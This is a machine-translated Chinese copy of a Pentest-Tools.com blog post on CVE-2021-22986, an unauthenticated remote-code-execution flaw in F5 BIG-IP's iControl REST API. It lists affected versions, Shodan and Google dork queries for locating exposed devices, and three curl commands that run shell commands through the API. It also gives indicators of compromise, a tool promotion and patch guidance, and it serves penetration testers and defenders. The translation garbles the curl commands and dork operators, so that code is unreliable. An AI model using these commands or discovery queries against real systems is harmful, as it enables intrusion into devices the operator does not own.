<html>
<head>
<title>How to detect CVE-2021-22986 RCE with Pentest-Tools.com | Pentest-Tools.com</title>
<link href="../Styles/Style.css" type="text/css" rel="stylesheet"/>
</head>
<body>
<h1>如何和Pentest-Tools.com一起检测CVE-2021-22986 RCE | Pentest-Tools.com</h1>
<blockquote>原文：<a href="https://pentest-tools.com/blog/detect-cve-2021-22986-rce#2022-10-06T14:29:47.000Z">https://pentest-tools.com/blog/detect-cve-2021-22986-rce#2022-10-06T14:29:47.000Z</a></blockquote><div><div class="prose prose-headings:break-words prose-img:rounded-md prose-img:ring-1 prose-img:ring-dark-blue-200 prose-img:ring-opacity-30 prose-code:break-words prose-headings:[scroll-margin-top:120px] xl:prose-lg xl:prose-headings:w-[628px] xl:prose-p:w-[628px]">
            
              
                
                  <p>作为一名测试者，当你看到一个重大的关键漏洞在未打补丁的系统中持续数月(如<a href="/blog/log4shell-scanner-detect-cve-2021-44228"> Log4Shell </a>)，你有责任帮助其他人了解其严重性以及他们如何修复它。这正是这篇文章存在的原因。</p><p>我们看到了许多易受攻击和未打补丁的系统，即使安全漏洞是在2021年3月左右发现的，所以我们不能袖手旁观。</p><p>大约在2021年3月被发现，<a target="_blank" href="https://nvd.nist.gov/vuln/detail/CVE-2021-22986" rel="external nofollow noopener noreferrer"> CVE-2021-22986 </a>仍然为许多易受攻击的系统中的攻击者敞开大门。因此，本指南专门介绍如何搜索易受攻击的主机，如何利用漏洞，以及缓解漏洞的解决方案。</p><h2 id="what-is-f5-icontrol"><strong>什么是F5 iControl？</strong></h2><p>F5 iControl是一款基于REST的API，允许您对自己管理的<a target="_blank" href="/blog/big-ip-tmui-rce"> BIG-IP设备</a>执行多项操作，例如更改系统配置。</p><p><img src="../Images/da8af7f8952890b52f3229cbda96aac6.png" alt="F5 iControl REST-based API architecture" loading="lazy" data-original-src="https://pentest-tools.com/blog/img/asset/YXNzZXRzL2NvbnRlbnQvZGV0ZWN0LWN2ZS0yMDIxLTIyOTg2LXJjZS91bnRpdGxlZC5wbmc=?s=7f295a36f4e41f7efb763c0971bded8e"/></p><p>(来源:<a target="_blank" href="https://www.f5.com/pdf/white-papers/icontrol-wp.pdf" rel="external nofollow noopener noreferrer"> F5 iControl白皮书</a>)</p><h2 id="what-is-cve-2021-22986">什么是CVE-2021-22986？</h2><p>我们来谈谈漏洞的来龙去脉。它于2021年早春被发现，尽管几个月过去了，但许多设备仍然容易受到攻击，许多威胁行为者正在积极利用这种漏洞。</p><p>但是是什么让它对恶意黑客如此有吸引力呢？</p><p>该漏洞的CVSS得分为9.8，被归类为“严重”，因为您可以通过<a target="_blank" href="/blog/?s=rce">远程命令执行</a>实现<strong>整个设备的危害</strong>。更糟糕的是，你可以做所有这些未经认证的<strong/>。此外，设备模式下的BIG-IP设备也容易受到攻击。</p><p>更糟糕的是，还观察到一个<a target="_blank" href="https://en.wikipedia.org/wiki/Mirai_(malware)" rel="external nofollow noopener noreferrer"> Mirai未来组合</a>变种一直在积极利用这个漏洞。</p><blockquote><p><em>我们现在观察到来自<a href="https://t.co/ZDTVwtdYlq" rel="external nofollow noopener noreferrer">https://t.co/ZDTVwtdYlq</a>的Mirai未来组合变种试图利用CVE-2021-22986、F5 BIG-IP &amp; BIG-IQ产品中未经认证的RCE和CVE-2020-28188。新活动的<br/> <br/> IOCs可在:<a href="https://t.co/bc0IySEAEk" rel="external nofollow noopener noreferrer">https://t.co/bc0IySEAEk</a><a href="https://t.co/ZsUqxq60XO" rel="external nofollow noopener noreferrer">pic.twitter.com/ZsUqxq60XO</a></em></p><p>—Unit 42(@ Unit 42 _ Intel)<a href="https://twitter.com/Unit42_Intel/status/1373017186818781190?ref_src=twsrc%5Etfw" rel="external nofollow noopener noreferrer">2021年3月19日</a></p></blockquote><p/><h2 id="vulnerable-products-and-versions"><strong>易受攻击的产品和版本</strong></h2><p>以下是CVE-2021-22986 RCE漏洞的受影响产品及其版本的列表，因此您可以检查您的技术堆栈中是否有此漏洞:</p><ul><li><p>F5 BIG-IP设备(LTM、AAM、高级WAF、AFM、Analytics、APM、ASM、DDHD、DNS、FPS、GTM、链路控制器、PEM、SSLO):</p><ul><li><p>12.1.0-12.1.5.2</p></li><li><p>13.1.0-13.1.3.5</p></li><li><p>14.1.0-14.1.3.1</p></li><li><p>15.1.0-15.1.2</p></li><li><p>16.0.0-16.0.1</p></li></ul></li></ul><p>现在您已经了解了所需的基本细节，让我们看看如何使用Pentest-Tools.com来检测和利用它。</p><h2 id="how-to-find-systems-potentially-impacted-by-cve-2021-22986"><strong>如何找到可能受到CVE-2021-22986影响的系统</strong></h2><p>我将展示三种主要方法来查找可能受CVE-2021-22986漏洞影响的主机和设备。</p><h3 id="using-shodan"><strong>使用Shodan </strong></h3><p>在撰写本文时，至少有6000台设备是通过Shodan找到的。</p><p><img src="../Images/c6ba519be7c3388649d376caef649861.png" alt="F5 BIG-IP devices shodan" loading="lazy" data-original-src="https://pentest-tools.com/blog/img/asset/YXNzZXRzL2NvbnRlbnQvZGV0ZWN0LWN2ZS0yMDIxLTIyOTg2LXJjZS91bnRpdGxlZC0xLnBuZw==?s=25f4dfbb31955b069fbf04ee9a36d5f7"/></p><p>您可以使用以下查询来发现易受此未经验证的RCE漏洞攻击的F5 BIG-IP潜在设备:</p><p><strong><em>http . title:" BIG-IP&amp;reg；</em>-重定向"</strong></p><h3 id="using-google-dorks"><strong>使用谷歌呆子</strong></h3><p>F5 BIG-IP设备使用基于网络的界面，因此您可以使用<a target="_blank" href="https://pentest-tools.com/information-gathering/google-hacking"> Google Dorks </a>通过以下搜索查询来发现F5主机:</p><p><em> inurl:my.logout.php3？</em></p><p>inurl:"/我的。政策“big-IP </p><p><em>intitle:“BIG-IP注销页面”</em></p><p><em> intext:“感谢您使用BIG-IP。”</em></p><p><em>英特尔文本:“该产品已获得F5 Networks的许可。”</em></p><p><em>英特尔公司:“F5网络公司。版权所有"</em></p><p> </p><p><img src="../Images/198dbc3d42ad5d21382d05c0b089398a.png" alt="Google Dorks page result" loading="lazy" data-original-src="https://pentest-tools.com/blog/img/asset/YXNzZXRzL2NvbnRlbnQvZGV0ZWN0LWN2ZS0yMDIxLTIyOTg2LXJjZS91bnRpdGxlZC0yLnBuZw==?s=cbac7190416c014397b578c3e4786891"/></p><h3 id="using-publicwww"><strong>使用PublicWWW </strong></h3><p><a target="_blank" rel="external nofollow noopener noreferrer" href="https://publicwww.com/"> PublicWWW </a>是一个搜索引擎，您可以使用它根据源代码内容、回复标题、cookies和使用的技术来搜索网站。您可以使用我刚才提到的相同的呆子，也可以使用一些更多的细节，如:</p><p><em> "my.logout.php3" </em></p><p><em> "/my.policy" </em></p><p><em>“BIG-IP注销页面”</em></p><p><em>“感谢您使用BIG-IP。”</em></p><p><em>“该产品已获得F5 Networks的许可。”</em></p><p><em>“F5网络。版权所有"</em></p><p><em> "Set-Cookie: F5_ST" </em></p><p><img src="../Images/90d1708e18d71913b8956d59c9b0a553.png" alt="F5 BIG-IP devices google dorks" loading="lazy" data-original-src="https://pentest-tools.com/blog/img/asset/YXNzZXRzL2NvbnRlbnQvZGV0ZWN0LWN2ZS0yMDIxLTIyOTg2LXJjZS91bnRpdGxlZC0yLSgxKS5wbmc=?s=d8f101f448620792bfbc0aa98ad77d64"/>通过书签<a href="https://publicwww.com/" rel="external nofollow noopener noreferrer">https://publicwww.com/</a>将此工具添加到您的工作流程中</p><h2 id="how-to-exploit-cve-2021-22986-in-ethical-hacking-engagements"><strong>如何在道德黑客活动中利用CVE-2021-22986</strong></h2><p>为了利用CVE-20212-22986，您必须遵循以下步骤:</p><ol start="1"><li><p>curl-ksu admin:https://<host>/mgmt/TM/access/bundle-install-tasks-d ' { " file path ":"<command>" } '</command></host></p></li><li><p>curl-ksu admin:https://<host>/mgmt/TM/access/bundle-install-tasks-d ' { " file path ":"<command>" } '</command></host></p></li><li><p>curl-su admin:-H " Content-Type:application/JSON " http://<host>:8100/mgmt/TM/util/bash-d ' { " command ":" run "，" utilCmdArgs":"-c <command> "} ' </command> </host></p></li></ol><p>如果您想尝试另一种更快的利用策略，请继续阅读并观看下面的演示。</p><h2 id="known-indicators-of-compromise-iocs-for-cve-2021-22986"><strong>CVE的已知危害指标(IoCs)2021-22986</strong></h2><p><a target="_blank" href="https://support.f5.com/csp/article/K03009991" rel="external nofollow noopener noreferrer">按F5 </a>，你应该(手动)在“/var/log/restjavad*中查找以下条目。日志”文件:</p><p><em>“X-F5-Auth-Token没有值”</em></p><p>在你的目标上验证CVE-2021-22986可被利用的最快和最省事的方法是使用<a href="https://pentest-tools.com/exploit-helpers/sniper"> <strong>狙击自动利用者</strong> </a>，Pentest-Tools.com上的自动攻击者。</p><p>该工具自动模拟现实世界的利用和攻击技术:</p><ul><li><p>它<strong>扫描打开的端口</strong>，收集关于协议、服务类型和版本的数据</p></li><li><p>它<strong>采集web服务的指纹</strong>以确定运行的web应用程序的类型及其背后的技术栈</p></li><li><p>它<strong>寻找兼容的漏洞</strong></p></li><li><p>它<strong>检查目标是否确实易受攻击</strong>——在此阶段不提取任何数据</p></li><li><p>一旦它获得RCE，Sniper自动<strong>提取所有的人工制品(</strong>当前和本地用户，系统信息，运行进程，网络配置等。)，这将在输出报告中得到</p></li><li><p>它<strong>清除</strong>，所以目标保持不变。</p></li></ul><p>正如你从演示中看到的，<em>这一切都在一分钟内发生</em>与手动开发相比，这是一个巨大的收益，尤其是当你在pentest中时间紧迫时(而当<em>没有发生</em>？).</p>

                

                
              
                
                  <div x-data="{ showVideo: false }" x-on:close.window.stop="showVideo = false" class="not-prose group relative flex items-center justify-center overflow-hidden rounded-xl">
  
  <p aria-hidden="true" class="pointer-events-none absolute inset-0 rounded-xl bg-gray-800 opacity-40"/>
  <p aria-hidden="true" class="absolute h-28 w-28 overflow-hidden rounded-full bg-white bg-opacity-5 shadow-lg ring-1 ring-white ring-opacity-20 transition duration-300 supports-backdrop-filter:backdrop-blur-sm group-hover:scale-110 group-hover:bg-opacity-10 group-hover:ring-opacity-30 sm:h-32 sm:w-32 lg:h-36 lg:w-36"/>
  <button type="button" aria-haspopup="true" x-bind:aria-expanded="showVideo ? showVideo : undefined" class="group absolute inset-0 flex w-full items-center justify-center rounded-3xl focus:outline-none" x-on:click="showVideo = true">
    <span class="sr-only">Play video</span>
    <svg class="h-24 w-24 rounded-full ring-offset-4 ring-offset-transparent transition-[box-shadow,transform] duration-300 group-hover:scale-105 group-focus:ring-4 group-focus:ring-white group-focus:ring-opacity-30 sm:h-28 sm:w-28 lg:h-32 lg:w-32" aria-hidden="true" viewbox="0 0 24 24" fill="none">
      <path class="text-white transition-[text-opacity] duration-300" fill="currentColor" d="M21 12a9 9 0 11-18 0 9 9 0 0118 0z"/>
      <path class="text-secondary-accent-500" fill="currentColor" d="M14.752 11.168l-3.197-2.132A1 1 0 0010 9.87v4.263a1 1 0 001.555.832l3.197-2.132a1 1 0 000-1.664z"/>
    </svg>
  </button>

  
  

  <template x-if="showVideo">
    
















<template x-teleport="body">
  <div x-data="modal" class="fixed inset-0 z-120 overflow-hidden overflow-y-auto" x-on:keydown.escape.window.prevent.stop="close" x-on:close.window="close" x-show="open">
    <div class="flex h-full justify-center items-center px-4 pt-4 pb-16 sm:p-0">
      <p x-show="open" x-transition.opacity="" aria-hidden="true" class="fixed inset-0 bg-gray-500/75 transition-opacity" x-on:click.stop="close"/>

      
      

      <div x-show="open" x-transition:enter="duration-300 ease-out" x-transition:enter-start="translate-y-4 opacity-0 sm:translate-y-0 sm:scale-95" x-transition:enter-end="translate-y-0 opacity-100 sm:scale-100" x-transition:leave="duration-200 ease-in" x-transition:leave-start="translate-y-0 opacity-100 sm:scale-100" x-transition:leave-end="translate-y-4 opacity-0 sm:translate-y-0 sm:scale-95" role="dialog" aria-modal="true" aria-labelledby="modal-headline" class="transform transition-[opacity,transform] sm:my-8 h-auto sm:w-auto" x-trap.noscroll.inert="open" x-on:transitionend.self.debounce="$focus.first()">
        <div class="relative sm:w-screen sm:max-w-xl lg:max-w-3xl xl:max-w-5xl">
        <h2 id="modal-title" class="sr-only">如何用Pentest-Tools.com检测F5 IControl REST未经认证的RCE (CVE-2021-22986)</h2>
        
        <p class="aspect-video overflow-hidden rounded-lg">                    </p>
      </div>
      </div>
    </div>
  </div>
</template>


  


  </template>
</div>



                

                
              
                
                  <p/><p>如果您需要一份包含F5 iControl REST未认证RCE的调查结果的报告，您可以使用Pentest-Tools.com<a href="https://pentest-tools.com/network-vulnerability-scanning/network-security-scanner-online-openvas"><strong>网络漏洞扫描器</strong> </a>。在您的目标上运行它，获得一份完整的、随时可用的报告，其中包含您可以与同事和客户分享的丰富细节:</p><p><img src="../Images/e8c8a1c02fbd08c75ce63bc0f3099a7c.png" alt="F5 iControl REST Unauthenticated RCE finding" loading="lazy" data-original-src="https://pentest-tools.com/blog/img/asset/YXNzZXRzL2NvbnRlbnQvZGV0ZWN0LWN2ZS0yMDIxLTIyOTg2LXJjZS91bnRpdGxlZC00LnBuZw==?s=4f304054a9c3f41da9a259da0baff743"/></p><h2 id="how-to-mitigate-cve-2021-22986"><strong>如何减轻CVE-2021-22986 </strong></h2><p>首先，建议为您的设备安装一个补丁版本:</p><ul><li><p>BIG-IP 16.0.1.1+版本</p></li><li><p>大IP 15.1.2.1+</p></li><li><p>大IP 14.1.4+</p></li><li><p>大IP 13.1.3.6+</p></li><li><p>大IP 12.1.5.3+</p></li><li><p>大智商7.1.0.3以上</p></li><li><p>大智商7.0.0.2以上</p></li></ul><p>如果出于某种原因，您无法应用此补丁，那么您<strong>应该限制除管理员地址之外的任何IP地址对iControl REST接口</strong>的访问。</p><h2 id="working-together-to-cope-with-the-landslide"><strong>齐心协力应对滑坡</strong></h2><p>不断出现的漏洞让安全专家处于救火模式，这真的很难跟上。这就是为什么在Pentest-Tools.com，我们相信通过分享专业知识、方法和见解来互相帮助，同时以一种真正有所作为的方式支持合作。这不是一件容易的工作，但这是我们的工作，我们致力于尽我们所能做到最好。</p><p>如果你需要一个具体的指导，来帮助你在你的职位上取得成功，并在工作中产生更大的影响——以及在行业中——请告诉我们！</p>

                

                
              
            
          </div>
        </div>    
</body>
</html>